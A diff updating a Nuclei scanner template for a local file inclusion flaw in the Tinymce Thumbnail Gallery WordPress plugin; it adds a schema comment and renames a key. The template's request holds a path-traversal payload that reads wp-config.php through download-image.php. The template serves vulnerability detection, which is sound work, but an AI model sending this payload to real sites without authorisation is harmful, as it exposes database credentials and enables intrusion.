@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-tinymce-lfi
 info:
   name: Tinymce Thumbnail Gallery <=1.0.7 - Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: wordpress,wp-theme,lfi,wordpress,tinymce
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php'
